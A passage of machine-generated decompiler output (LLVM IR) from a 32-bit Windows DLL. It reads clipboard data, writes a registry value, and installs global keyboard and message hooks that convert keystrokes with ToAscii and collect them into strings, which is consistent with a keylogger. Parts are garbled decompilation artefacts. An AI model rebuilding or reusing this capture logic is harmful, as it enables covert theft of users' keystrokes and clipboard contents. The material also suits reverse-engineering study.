  %84 = inttoptr i32 %83 to i32*, !insn.addr !644
  store i32 %82, i32* %84, align 4, !insn.addr !644
  %85 = add i32 %esp.1.reload, -8, !insn.addr !645
  %86 = inttoptr i32 %85 to i32*, !insn.addr !645
  store i32 1, i32* %86, align 4, !insn.addr !645
  %87 = add i32 %esp.1.reload, -12, !insn.addr !646
  %88 = inttoptr i32 %87 to i32*, !insn.addr !646
  store i32 0, i32* %88, align 4, !insn.addr !646
  %89 = add i32 %esp.1.reload, -16, !insn.addr !647
  %90 = inttoptr i32 %89 to i32*, !insn.addr !647
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !647
  %91 = add i32 %arg6, -8, !insn.addr !648
  %92 = inttoptr i32 %91 to i32*, !insn.addr !648
  %93 = load i32, i32* %92, align 4, !insn.addr !648
  %94 = add i32 %esp.1.reload, -20, !insn.addr !649
  %95 = inttoptr i32 %94 to i32*, !insn.addr !649
  store i32 %93, i32* %95, align 4, !insn.addr !649
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !650
  %97 = load i32, i32* %92, align 4, !insn.addr !651
  %98 = add i32 %esp.1.reload, -24, !insn.addr !652
  %99 = inttoptr i32 %98 to i32*, !insn.addr !652
  store i32 %97, i32* %99, align 4, !insn.addr !652
  %100 = call i32 @function_404374(), !insn.addr !653
  %101 = load i32, i32* %99, align 4, !insn.addr !654
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !655
  store i32 4214421, i32* %90, align 4, !insn.addr !656
  %102 = call i32 @"@LStrClr"(), !insn.addr !657
  ret i32 %102, !insn.addr !658
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !659
  ret i32 %0, !insn.addr !659
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !660
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !661
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !662
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !662
  %5 = inttoptr i32 %2 to i8*, !insn.addr !662
  store i8 %4, i8* %5, align 1, !insn.addr !662
  %6 = add i32 %0, 111, !insn.addr !663
  %7 = inttoptr i32 %6 to i8*, !insn.addr !663
  %8 = load i8, i8* %7, align 1, !insn.addr !663
  %9 = trunc i32 %1 to i8, !insn.addr !663
  %10 = add i8 %8, %9, !insn.addr !663
  %11 = icmp eq i8 %10, 0, !insn.addr !663
  store i8 %10, i8* %7, align 1, !insn.addr !663
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !664

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !664
  br label %dec_label_pc_404ea1, !insn.addr !664

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !663
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !665

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !345, !insn.addr !663
  %16 = and i8 %15, 1, !insn.addr !663
  %17 = icmp eq i8 %16, 0, !insn.addr !663
  %18 = trunc i32 %arg4 to i16, !insn.addr !666
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !666
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !666
  store i32 %19, i32* %20, align 4, !insn.addr !666
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !667

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !668
  %22 = icmp eq i32 %21, 0, !insn.addr !668
  store i32 %arg2, i32* %.reg2mem, !insn.addr !669
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !669

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !670
  %24 = trunc i32 %21 to i16, !insn.addr !671
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !671
  %26 = load i32, i32* %25, align 4, !insn.addr !671
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !671
  %27 = load i32, i32* %25, align 4, !insn.addr !672
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !672
  %28 = add i32 %arg7, 105, !insn.addr !673
  %29 = inttoptr i32 %28 to i8*, !insn.addr !673
  %30 = load i8, i8* %29, align 1, !insn.addr !673
  %31 = trunc i32 %23 to i8, !insn.addr !673
  %32 = add i8 %30, %31, !insn.addr !673
  %33 = icmp eq i8 %32, 0, !insn.addr !673
  store i8 %32, i8* %29, align 1, !insn.addr !673
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !674

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !675
  %34 = inttoptr i32 %23 to i8*, !insn.addr !676
  %35 = load i8, i8* %34, align 1, !insn.addr !676
  %36 = add i8 %35, %31, !insn.addr !676
  store i8 %36, i8* %34, align 1, !insn.addr !676
  %37 = add i32 %arg5, 86, !insn.addr !677
  %38 = inttoptr i32 %37 to i8*, !insn.addr !677
  %39 = load i8, i8* %38, align 1, !insn.addr !677
  %40 = trunc i32 %21 to i8, !insn.addr !677
  %41 = add i8 %39, %40, !insn.addr !677
  store i8 %41, i8* %38, align 1, !insn.addr !677
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !678
  %42 = call i32 @"@LStrClr"(), !insn.addr !679
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !680
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !681
  %44 = zext i1 %43 to i32, !insn.addr !682
  ret i32 %44, !insn.addr !682

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !683
  %46 = inttoptr i32 %45 to i8*, !insn.addr !683
  %47 = load i8, i8* %46, align 2, !insn.addr !683
  %48 = mul i8 %47, 2, !insn.addr !683
  store i8 %48, i8* %46, align 2, !insn.addr !683
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !684
  %50 = icmp eq i32* %49, null, !insn.addr !685
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !686

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !684
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !687
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !688
  %53 = icmp eq i32* %52, null, !insn.addr !689
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !690

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !691
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !692
  br label %dec_label_pc_404f04, !insn.addr !692

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !693
  br label %dec_label_pc_404f09, !insn.addr !693

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !694
  %57 = sext i1 %56 to i32, !insn.addr !694
  store i32 %57, i32* %.reg2mem, !insn.addr !695
  br label %dec_label_pc_404f0f, !insn.addr !695

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !696
  ret i32 %.reload, !insn.addr !696
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !697
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !697
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !698
  %4 = inttoptr i32 %3 to i32*, !insn.addr !699
  %5 = load i32, i32* %4, align 4, !insn.addr !699
  %6 = icmp eq i32 %5, 0, !insn.addr !699
  %7 = icmp eq i1 %6, false, !insn.addr !700
  %8 = icmp eq i1 %7, false, !insn.addr !701
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !701

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !702
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !703
  %11 = icmp eq i32* %10, null, !insn.addr !704
  %12 = icmp eq i1 %11, false, !insn.addr !705
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !705

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220648 to i32*), i32 0, i32* null), !insn.addr !706
  br label %dec_label_pc_404f50, !insn.addr !706

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !707
  store i32 0, i32* %15, align 4, !insn.addr !707
  ret i32 -2147221231, !insn.addr !708
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !709
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !710
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !711
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !712
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !712
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !712
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !713
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !714
  %3 = add i32 %2, 1, !insn.addr !714
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !714
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !715
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !716
  ret i32 0, !insn.addr !717
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !718
  ret i32 %0, !insn.addr !718
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !719
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !720
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !721
  %2 = add i32 %1, -1, !insn.addr !721
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !721
  ret i32 %0, !insn.addr !722
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !723
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !724
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !724
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !724
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !725
  %4 = call i32 @function_4071cc(), !insn.addr !726
  %5 = icmp ne i32 %4, 0, !insn.addr !727
  %6 = icmp eq i1 %5, false, !insn.addr !728
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !729
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !729

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_407268(), !insn.addr !730
  %8 = call i32 @"@LStrDelete"(), !insn.addr !731
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !732
  br label %dec_label_pc_4050bb, !insn.addr !732

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_407268(), !insn.addr !733
  %10 = call i32 @"@LStrDelete"(), !insn.addr !734
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !735
  br label %dec_label_pc_4050bb, !insn.addr !735

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !736
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !737
  %14 = udiv i32 %1, 65536, !insn.addr !738
  %15 = and i32 %14, 255, !insn.addr !739
  %16 = inttoptr i32 %15 to i16*, !insn.addr !740
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !741
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !742
  %19 = icmp eq i32 %18, 1, !insn.addr !743
  %20 = icmp eq i1 %19, false, !insn.addr !744
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !744
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !744

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406f30(), !insn.addr !745
  %22 = icmp eq i32 %21, 0, !insn.addr !746
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !747
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !747

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !748
  %24 = icmp sgt i32 %23, 15, !insn.addr !749
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !749
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !749

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_407268(), !insn.addr !750
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !751
  %27 = call i32 @"@LStrInsert"(), !insn.addr !752
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !752
  br label %dec_label_pc_4050bb, !insn.addr !752

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !753
  %29 = load i32, i32* %28, align 4, !insn.addr !753
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !754
  %30 = add i32 %esp.0.reload, 8, !insn.addr !755
  %31 = inttoptr i32 %30 to i32*, !insn.addr !755
  store i32 4215003, i32* %31, align 4, !insn.addr !755
  %32 = call i32 @"@LStrClr"(), !insn.addr !756
  ret i32 %32, !insn.addr !757
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !758
  ret i32 %0, !insn.addr !758
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !759
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !760
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !761
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !761
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !761
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !762
  %2 = call i32 @function_4071cc(), !insn.addr !763
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !764
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !765
  %4 = add i32 %1, 8, !insn.addr !766
  %5 = inttoptr i32 %4 to i32*, !insn.addr !766
  store i32 4215210, i32* %5, align 4, !insn.addr !766
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !767
  ret i32 %6, !insn.addr !768
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !769
  ret i32 %0, !insn.addr !769
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !770
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !771
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !772
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !773
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !773
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !773
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !774
  %3 = call i32 @function_40713c(), !insn.addr !775
  %4 = icmp eq i32 %3, 0, !insn.addr !776
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !777
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !777

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !778
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !779
  %7 = ptrtoint i32* %6 to i32, !insn.addr !779
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !780
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !780
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !781
  %10 = icmp eq i1 %9, false, !insn.addr !782
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !783

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_406f9c(), !insn.addr !784
  %12 = call i32 @"@LStrAsg"(), !insn.addr !785
  %13 = call i32 @function_4072c4(), !insn.addr !786
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !787
  br label %dec_label_pc_405214, !insn.addr !787

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_4073f8(), !insn.addr !788
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !788
  br label %dec_label_pc_405214, !insn.addr !788

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !789
  %16 = load i32, i32* %15, align 4, !insn.addr !789
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !790
  %17 = add i32 %esp.0.reload, 8, !insn.addr !791
  %18 = inttoptr i32 %17 to i32*, !insn.addr !791
  store i32 4215345, i32* %18, align 4, !insn.addr !791
  %19 = call i32 @"@LStrClr"(), !insn.addr !792
  ret i32 %19, !insn.addr !793
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !794
  ret i32 %0, !insn.addr !794
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !795
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !796
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !797
  %8 = inttoptr i32 %4 to i8*, !insn.addr !797
  store i8 %7, i8* %8, align 1, !insn.addr !797
  %9 = add i32 %2, 111, !insn.addr !798
  %10 = inttoptr i32 %9 to i8*, !insn.addr !798
  %11 = load i8, i8* %10, align 1, !insn.addr !798
  %12 = load i32, i32* %eax, align 4, !insn.addr !798
  %13 = trunc i32 %12 to i8, !insn.addr !798
  %14 = add i8 %11, %13, !insn.addr !798
  store i8 %14, i8* %10, align 1, !insn.addr !798
  %15 = trunc i32 %3 to i16, !insn.addr !799
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !799
  %17 = inttoptr i32 %0 to i32*, !insn.addr !799
  store i32 %16, i32* %17, align 4, !insn.addr !799
  %18 = add i32 %0, 66, !insn.addr !800
  %19 = inttoptr i32 %18 to i64*, !insn.addr !800
  %20 = load i64, i64* %19, align 4, !insn.addr !800
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !800
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !801
  %22 = load i8, i8* %5, align 4, !insn.addr !802
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !802
  %25 = add i8 %22, %24, !insn.addr !802
  %26 = inttoptr i32 %23 to i8*, !insn.addr !802
  store i8 %25, i8* %26, align 1, !insn.addr !802
  %27 = add i32 %21, -117, !insn.addr !803
  %28 = inttoptr i32 %27 to i8*, !insn.addr !803
  %29 = load i8, i8* %28, align 1, !insn.addr !803
  %30 = trunc i32 %3 to i8, !insn.addr !803
  %31 = add i8 %29, %30, !insn.addr !803
  store i8 %31, i8* %28, align 1, !insn.addr !803
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !804
  %33 = add i32 %21, 16, !insn.addr !805
  %34 = inttoptr i32 %33 to i32*, !insn.addr !805
  %35 = load i32, i32* %34, align 4, !insn.addr !805
  %36 = add i32 %21, 12, !insn.addr !806
  %37 = inttoptr i32 %36 to i32*, !insn.addr !806
  %38 = load i32, i32* %37, align 4, !insn.addr !806
  %39 = add i32 %21, 8, !insn.addr !807
  %40 = inttoptr i32 %39 to i32*, !insn.addr !807
  %41 = load i32, i32* %40, align 4, !insn.addr !807
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !808
  %43 = inttoptr i32 %42 to i32*, !insn.addr !809
  %44 = load i32, i32* %43, align 4, !insn.addr !809
  %45 = icmp eq i32 %44, 0, !insn.addr !809
  %46 = icmp eq i1 %45, false, !insn.addr !810
  %47 = icmp eq i32 %41, 0, !insn.addr !811
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !812
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !813

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !814
  %51 = add i32 %35, 4, !insn.addr !815
  %52 = inttoptr i32 %51 to i32*, !insn.addr !815
  %53 = load i32, i32* %52, align 4, !insn.addr !815
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !816
  br label %dec_label_pc_40529a, !insn.addr !817

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !818
  br label %dec_label_pc_40529a, !insn.addr !818

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !819
  %57 = inttoptr i32 %35 to i32*, !insn.addr !820
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !820
  ret i32 %58, !insn.addr !821
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !822
  %5 = icmp eq i1 %4, false, !insn.addr !823
  %6 = icmp eq i32 %arg3, 0, !insn.addr !824
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !825

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !826
  %9 = inttoptr i32 %8 to i32*, !insn.addr !826
  %10 = load i32, i32* %9, align 4, !insn.addr !826
  %11 = icmp eq i32 %10, 2, !insn.addr !827
  %12 = icmp eq i1 %11, false, !insn.addr !828
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !828

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !829
  br label %dec_label_pc_4052e0, !insn.addr !829

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !830
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !831
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !831
  ret i32 %16, !insn.addr !832
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !833
  %2 = ptrtoint i32* %1 to i32, !insn.addr !833
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !834
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !835
  %5 = ptrtoint i32* %4 to i32, !insn.addr !835
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !836
  ret i32 %5, !insn.addr !837
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !838
  %1 = inttoptr i32 %0 to i32*, !insn.addr !839
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !839
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !840
  %4 = inttoptr i32 %3 to i32*, !insn.addr !841
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !841
  %6 = sext i1 %5 to i32, !insn.addr !841
  ret i32 %6, !insn.addr !842
}

